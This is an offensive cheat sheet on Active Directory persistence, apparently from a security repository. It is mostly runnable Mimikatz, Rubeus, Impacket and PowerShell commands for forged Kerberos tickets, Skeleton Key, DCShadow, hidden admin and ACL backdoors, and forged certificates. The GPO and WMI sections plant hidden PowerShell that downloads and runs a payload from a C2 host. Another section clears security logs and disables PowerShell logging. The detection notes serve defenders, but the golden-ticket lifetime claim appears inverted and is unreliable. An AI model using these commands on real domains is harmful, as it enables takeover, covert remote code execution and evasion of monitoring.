# Active Directory Persistence

> **Persistence Techniques for Enterprise Active Directory Environments**
> *Maintaining long-term access through multiple attack vectors*

**MITRE ATT&CK**: T1098 (Account Manipulation), T1136 (Create Account), T1547 (Boot/Logon Autostart), T1078 (Valid Accounts), T1556 (Modify Authentication Process)

**Last Updated**: January 2025

---

## Kerberos Persistence

### Golden Ticket

**Concept**: Forge a TGT (Ticket Granting Ticket) using the `krbtgt` account hash, providing domain-wide access.

**Requirements**:
- krbtgt NTLM hash or AES256 key
- Domain SID
- Username to impersonate

**Implementation (Mimikatz)**:
```powershell
# 1. Obtain krbtgt hash via DCSync
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# 2. Create Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:<NTLM_HASH> /id:500 /ptt

# 3. Verify ticket injection
mimikatz # kerberos::list

# Access DC
dir \\DC01\C$
```

**Rubeus Alternative**:
```powershell
# Create golden ticket (AES256)
Rubeus.exe golden /aes256:<AES256_KEY> /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /nowrap

# Inject ticket
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

**Linux (Impacket)**:
```bash
# Create golden ticket
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXX -domain corp.local Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@DC01 -k -no-pass
```

**Detection**:
- Event ID 4768/4769: Unusual lifetime (10 hours default for golden tickets vs 10 minutes for real TGTs)
- PAC validation failures
- Tickets with encryption type downgrade (RC4 when AES is enforced)
- TGTs requested from non-DC sources

**Removal**:
```powershell
# Reset krbtgt password TWICE (maintains backward compatibility for 10 hours)
# First reset
Reset-KrbtgtPassword -Identity krbtgt -DomainController DC01

# Wait 10+ hours or manually clear all Kerberos tickets
# Second reset
Reset-KrbtgtPassword -Identity krbtgt -DomainController DC01
```

---

### Silver Ticket

**Concept**: Forge TGS (Ticket Granting Service) for specific services without contacting DC.

**Targets**:
- CIFS (file sharing): `cifs/server.corp.local`
- HTTP (web apps): `http/server.corp.local`
- MSSQL: `MSSQLSvc/server.corp.local:1433`
- LDAP (DC replication): `ldap/dc.corp.local`

**Implementation**:
```powershell
# Obtain service account hash
mimikatz # sekurlsa::logonpasswords

# Create silver ticket for CIFS
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /target:FILE-SERVER.corp.local /service:cifs /rc4:<SERVICE_NTLM> /ptt

# Access file share
dir \\FILE-SERVER\C$
```

**Detection**:
- Event ID 4769: Service ticket requests from unusual sources
- Service ticket encryption type mismatches
- Service accounts with abnormal SPNs

**MITRE ATT&CK**: T1558.002

---

### Diamond Ticket

**Concept**: Modern evasive technique that modifies legitimate TGTs to bypass PAC validation.

**Advantages over Golden Tickets**:
- Uses legitimate TGT from DC
- Modifies PAC to add privileges
- Bypasses detection based on ticket lifetime anomalies

**Implementation (Rubeus)**:
```powershell
# Request TGT, modify PAC, request TGS
Rubeus.exe diamond /tgtdeleg /ticketuser:lowpriv /ticketuserid:1104 /groups:512 /krbkey:<KRBTGT_AES256>

# Alternative: use existing TGT
Rubeus.exe diamond /tgt:<BASE64_TGT> /ticketuser:Administrator /groups:512,519 /krbkey:<KRBTGT_AES256>
```

**Detection**:
- More difficult than golden tickets (uses real DC-issued TGTs)
- Focus on PAC privilege anomalies
- Monitor for lowpriv → highpriv transitions within same TGT

**MITRE ATT&CK**: T1558.001

---

### Skeleton Key

**Concept**: Patch LSASS on Domain Controller to accept a master password for all accounts.

**Implementation (Mimikatz)**:
```powershell
# On Domain Controller (requires administrative access)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Default skeleton key password: "mimikatz"
# Now authenticate as any user with password "mimikatz"
net use \\DC01\C$ /user:Administrator mimikatz
```

**Detection**:
- Event ID 7045: New service installation (Mimikatz driver)
- Event ID 4673: Sensitive privilege use (SeDebugPrivilege on lsass.exe)
- LSASS memory modification alerts
- Failed authentications followed by successful authentication with different password

**Removal**:
```powershell
# Reboot DC (skeleton key is in-memory only)
Restart-Computer -Force
```

**MITRE ATT&CK**: T1556.004

---

### DCShadow

**Concept**: Register rogue Domain Controller to replicate malicious changes without direct DC access.

**Use Cases**:
- Create hidden admin accounts
- Modify ACLs silently
- Add SID History
- Modify object attributes without DC logs

**Implementation (Mimikatz)**:
```powershell
# On two separate machines:

# Machine 1 (will become fake DC)
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:targetUser /attribute:sidHistory /value:S-1-5-21-XXX-512

# Machine 2 (trigger replication)
mimikatz # lsadump::dcshadow /push
```

**Detection**:
- Event ID 4742: Computer account changed (new DC registered)
- Event ID 4662: Replication from unauthorized source
- Monitor for new nTDSDSA objects
- Unexpected DSA changes in Configuration partition

**MITRE ATT&CK**: T1207

---

## Account Manipulation

### Hidden Admin Accounts

**Technique 1: AdminSDHolder Persistence**
```powershell
# Add user to AdminSDHolder ACL
Import-Module ActiveDirectory
$user = Get-ADUser "BackdoorUser"
$adminSDHolder = Get-ADObject "CN=AdminSDHolder,CN=System,DC=corp,DC=local"

# Grant GenericAll permission
$acl = Get-Acl -Path "AD:$($adminSDHolder.DistinguishedName)"
$sid = [System.Security.Principal.SecurityIdentifier]$user.SID
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericAll", "Allow")
$acl.AddAccessRule($ace)
Set-Acl -Path "AD:$($adminSDHolder.DistinguishedName)" -AclObject $acl

# Wait for SDProp to propagate (60 min default) or trigger manually
Invoke-ADSDPropagation
```

**Technique 2: Computer Account Backdoor**
```powershell
# Create computer account (less monitored than user accounts)
New-ADComputer -Name "BACKDOOR-PC" -Path "OU=Workstations,DC=corp,DC=local"

# Set password
$password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
Set-ADAccountPassword -Identity "BACKDOOR-PC$" -NewPassword $password -Reset

# Add to privileged group
Add-ADGroupMember -Identity "Domain Admins" -Members "BACKDOOR-PC$"

# Authenticate using computer account
Rubeus.exe asktgt /user:BACKDOOR-PC$ /password:P@ssw0rd! /domain:corp.local
```

**Detection**:
- Event ID 4720: New user/computer account created
- Event ID 4728: Member added to security-enabled global group
- AdminCount attribute set to 1 on non-privileged accounts
- Unusual computer accounts in admin groups

**Removal**:
```powershell
# Remove from AdminSDHolder
Remove-ADPermission -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -User "BackdoorUser" -AccessRights GenericAll

# Delete computer account
Remove-ADComputer -Identity "BACKDOOR-PC" -Confirm:$false
```

---

### SID History Injection

**Concept**: Add SID History attribute to user, granting cross-domain privileges.

**Implementation (Mimikatz)**:
```powershell
# Add Enterprise Admins SID to user's SID History
mimikatz # sid::patch
mimikatz # sid::add /sam:targetuser /sid:S-1-5-21-ROOT-DOMAIN-519

# Verify
Get-ADUser targetuser -Properties sidHistory
```

**Linux (Impacket)**:
```bash
# Add SID History via ntlmrelayx (requires NTLM relay to LDAP)
ntlmrelayx.py -t ldaps://DC01 --sid-add S-1-5-21-XXX-512
```

**Detection**:
- Event ID 4766: SID filtering prevented cross-forest authentication
- Users with unexpected SID History values
- Monitor `sidHistory` attribute modifications

**Removal**:
```powershell
# Clear SID History
Set-ADUser targetuser -Remove @{sidHistory="S-1-5-21-XXX-519"}
```

**MITRE ATT&CK**: T1134.005

---

## ACL/Permission Backdoors

### DACL Modification for Persistence

**Grant DCSync Rights**:
```powershell
# Using PowerView
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity "BackdoorUser" -Rights DCSync

# Manual ACL modification
Import-Module ActiveDirectory
$user = Get-ADUser "BackdoorUser"
$domain = Get-ADDomain
$acl = Get-Acl -Path "AD:\$($domain.DistinguishedName)"

# Grant DS-Replication-Get-Changes
$sid = [System.Security.Principal.SecurityIdentifier]$user.SID
$objectGuid = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", $objectGuid)

# Grant DS-Replication-Get-Changes-All
$objectGuid2 = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", $objectGuid2)

$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl -Path "AD:\$($domain.DistinguishedName)" -AclObject $acl
```

**Grant WriteDacl on AdminSDHolder**:
```powershell
# Allows persistent privilege escalation
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity "BackdoorUser" -Rights WriteDAC
```

**Detection**:
- Event ID 5136: Directory service object modified (with ACL changes)
- Regular audits with BloodHound/PingCastle
- Monitor critical objects (AdminSDHolder, Domain root, DC OU)

**MITRE ATT&CK**: T1098.002

---

### DSRM Backdoor

**Concept**: Directory Services Restore Mode password becomes permanent backdoor.

**Implementation**:
```powershell
# On DC, change DSRM password
ntdsutil
set dsrm password
reset password on server null
<NewPassword>
quit
quit

# Enable DSRM network logon
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Authenticate using DSRM account
sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:<DSRM_HASH>
```

**Detection**:
- Event ID 4794: DSRM password change
- Registry key modification: `DsrmAdminLogonBehavior`
- Network logons to DC with local Administrator account

**MITRE ATT&CK**: T1098

---

## GPO-Based Persistence

### Scheduled Task via GPO

**Implementation**:
```powershell
# Create GPO
New-GPO -Name "Backdoor Scheduled Task" -Domain corp.local

# Add scheduled task XML
$taskXML = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2">
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoP -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString('http://C2SERVER/payload.ps1')"</Arguments>
    </Exec>
  </Actions>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
</Task>
"@

# Import to GPO
Set-GPRegistryValue -Name "Backdoor Scheduled Task" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0" -ValueName "Script" -Type String -Value $taskXML

# Link to target OU
New-GPLink -Name "Backdoor Scheduled Task" -Target "OU=Workstations,DC=corp,DC=local"
```

**Detection**:
- Event ID 5136: GPO modification
- Event ID 4698: Scheduled task created
- GPO version changes without authorization
- Unusual startup/logon scripts

**Removal**:
```powershell
Remove-GPO -Name "Backdoor Scheduled Task"
```

**MITRE ATT&CK**: T1053.005

---

### Immediate Scheduled Task

**Concept**: Deploy scheduled task that executes immediately (not waiting for GPO refresh).

**Implementation (SharpGPOAbuse)**:
```powershell
# Add immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c powershell.exe -NoP -W Hidden -C IEX(IWR('http://C2/payload.ps1'))" --GPOName "Default Domain Policy"
```

**MITRE ATT&CK**: T1053.005

---

## Certificate-Based Persistence

### Shadow Credentials (msDS-KeyCredentialLink)

**Concept**: Add certificate-based authentication to user/computer account without knowing password.

**Requirements**:
- WriteProperty permissions on target object's `msDS-KeyCredentialLink` attribute
- AD CS configured for certificate authentication
- Windows Server 2016+ Domain Functional Level

**Implementation (Whisker)**:
```powershell
# Add shadow credential
Whisker.exe add /target:targetuser /domain:corp.local /dc:DC01

# Authenticate using certificate
Rubeus.exe asktgt /user:targetuser /certificate:<BASE64_CERT> /password:"<CERT_PASSWORD>" /domain:corp.local /dc:DC01 /getcredentials
```

**Certipy Alternative**:
```bash
# Linux - Add shadow credential
certipy shadow auto -u lowpriv@corp.local -p 'Password123' -account targetuser

# Retrieve NTLM hash
certipy shadow auto -u lowpriv@corp.local -p 'Password123' -account targetuser -use-ldap
```

**Detection**:
- Event ID 5136: `msDS-KeyCredentialLink` attribute modified
- Unusual certificate authentication requests
- Monitor for Whisker/Certipy tool artifacts

**Removal**:
```powershell
# Clear msDS-KeyCredentialLink
Set-ADUser targetuser -Clear msDS-KeyCredentialLink
```

**MITRE ATT&CK**: T1556.004

---

### Golden Certificate

**Concept**: Forge certificates using stolen CA private key.

**Implementation (ForgeCert)**:
```powershell
# Extract CA certificate and private key
Certify.exe ca /ca:CA-SERVER\Corp-CA /enrolleeSuppliesSubject

# Forge certificate for any user
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject "CN=Administrator,CN=Users,DC=corp,DC=local" --SubjectAltName "Administrator@corp.local" --NewCertPath admin.pfx --NewCertPassword Password123

# Authenticate
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:Password123 /domain:corp.local
```

**Detection**:
- CA certificate private key export
- Certificates issued with unusual lifetimes or templates
- Certificate authentication from unusual sources

**MITRE ATT&CK**: T1649

---

## DCSync Persistence

### Persistent DCSync Rights

**Grant Replication Permissions**:
```powershell
# Using PowerView
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity "serviceaccount" -Rights DCSync -Verbose

# Verify permissions
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "Replication"}
```

**DCSync Execution**:
```powershell
# Mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator

# Impacket
secretsdump.py corp.local/serviceaccount:Password123@DC01
```

**Detection**:
- Event ID 4662: Replication requests from non-DC sources
- Event ID 5136: ACL modifications granting replication rights
- Monitor for `DS-Replication-Get-Changes` permissions on non-DC accounts

**MITRE ATT&CK**: T1003.006

---

## WMI/Registry Persistence

### WMI Event Subscription

**Implementation**:
```powershell
# Create WMI event filter (trigger)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "BackdoorFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create WMI consumer (action)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "BackdoorConsumer"
    CommandLineTemplate = 'powershell.exe -NoP -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString(''http://C2/payload.ps1'')"'
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**Detection**:
- Event ID 5858/5859/5860/5861: WMI activity
- Query WMI subscriptions: `Get-WmiObject -Namespace root\subscription -Class __EventFilter`
- Sysmon Event ID 19/20/21: WMI event monitoring

**Removal**:
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "BackdoorFilter"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "BackdoorConsumer"} | Remove-WmiObject
```

**MITRE ATT&CK**: T1546.003

---

## Advanced Persistence

### LAPS Password Access

**Concept**: Abuse read permissions on `ms-Mcs-AdmPwd` attribute (local admin passwords).

**Implementation**:
```powershell
# Grant read access to LAPS passwords
Add-DomainObjectAcl -TargetIdentity "OU=Workstations,DC=corp,DC=local" -PrincipalIdentity "BackdoorUser" -Rights ReadProperty -PropertyName "ms-Mcs-AdmPwd"

# Read LAPS passwords
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd
```

**Detection**:
- Event ID 4662: LAPS password attribute accessed
- Audit read access to `ms-Mcs-AdmPwd`

**MITRE ATT&CK**: T1003.008

---

## Detection Evasion

### Log Tampering

**Clear Security Event Log**:
```powershell
# Requires administrative privileges
wevtutil cl Security
```

**Disable PowerShell Logging**:
```powershell
# Disable Script Block Logging
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Disable Module Logging
Remove-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -ErrorAction SilentlyContinue
```

**Detection**:
- Event ID 1102: Audit log cleared
- Missing event IDs in security log
- Registry modifications to logging policies

**MITRE ATT&CK**: T1070.001

---

## Summary Table

| Persistence Technique | Difficulty | Stealth | Removal Difficulty | MITRE ATT&CK |
|-----------------------|------------|---------|-------------------|-------------|
| Golden Ticket | 🔴 High | 🟡 Medium | 🔴 High | T1558.001 |
| Silver Ticket | 🟡 Medium | 🟢 High | 🟢 Low | T1558.002 |
| Diamond Ticket | 🔴 High | 🔴 Very High | 🔴 High | T1558.001 |
| Skeleton Key | 🔴 High | 🟡 Medium | 🟢 Low (reboot) | T1556.004 |
| DCShadow | ⚫ Expert | 🔴 Very High | 🟡 Medium | T1207 |
| Shadow Credentials | 🟡 Medium | 🔴 Very High | 🟡 Medium | T1556.004 |
| ACL Backdoors | 🟡 Medium | 🔴 Very High | 🔴 High | T1098.002 |
| GPO Persistence | 🟢 Low | 🟡 Medium | 🟢 Low | T1053.005 |
| WMI Subscriptions | 🟡 Medium | 🔴 Very High | 🟡 Medium | T1546.003 |
| DCSync Rights | 🟡 Medium | 🟢 High | 🟡 Medium | T1003.006 |

---

**Last Updated**: 2025-01-09
**Author**: Zemarkhos
**Repository**: Awesome-Collection/11-Active-Directory
